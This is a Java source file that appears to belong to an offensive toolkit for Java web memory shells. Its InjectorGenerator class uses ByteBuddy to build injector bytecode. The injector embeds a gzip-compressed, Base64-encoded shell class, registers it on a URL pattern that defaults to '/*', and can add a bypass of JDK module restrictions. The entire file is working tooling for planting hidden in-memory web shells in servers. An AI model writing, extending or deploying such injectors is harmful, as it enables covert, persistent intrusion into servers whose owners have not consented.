package com.reajason.javaweb.memsell;

import com.reajason.javaweb.buddy.ByPassJdkModuleInterceptor;
import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
import com.reajason.javaweb.config.InjectorConfig;
import com.reajason.javaweb.config.ShellConfig;
import com.reajason.javaweb.util.CommonUtil;
import lombok.SneakyThrows;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.dynamic.DynamicType;
import net.bytebuddy.implementation.FixedValue;
import org.apache.commons.codec.binary.Base64;

import java.util.Objects;

import static net.bytebuddy.matcher.ElementMatchers.named;

/**
 * @author ReaJason
 * @since 2024/11/24
 */
public class InjectorGenerator {

    @SneakyThrows
    public static byte[] generate(ShellConfig config, InjectorConfig injectorConfig) {
        String base64String = Base64.encodeBase64String(
                        CommonUtil.gzipCompress(injectorConfig.getShellClassBytes()))
                .replace(System.lineSeparator(), "");
        DynamicType.Builder<?> builder = new ByteBuddy()
                .redefine(injectorConfig.getInjectorClass())
                .name(injectorConfig.getInjectorClassName())
                .visit(new TargetJreVersionVisitorWrapper(config.getTargetJreVersion()))
                .method(named("getUrlPattern")).intercept(FixedValue.value(Objects.toString(injectorConfig.getUrlPattern(), "/*")))
                .method(named("getBase64String")).intercept(FixedValue.value(base64String))
                .method(named("getClassName")).intercept(FixedValue.value(injectorConfig.getShellClassName()));

        if (config.needByPassJdkModule()) {
            builder = ByPassJdkModuleInterceptor.extend(builder);
        }

        try (DynamicType.Unloaded<?> make = builder.make()) {
            return make.getBytes();
        }
    }
}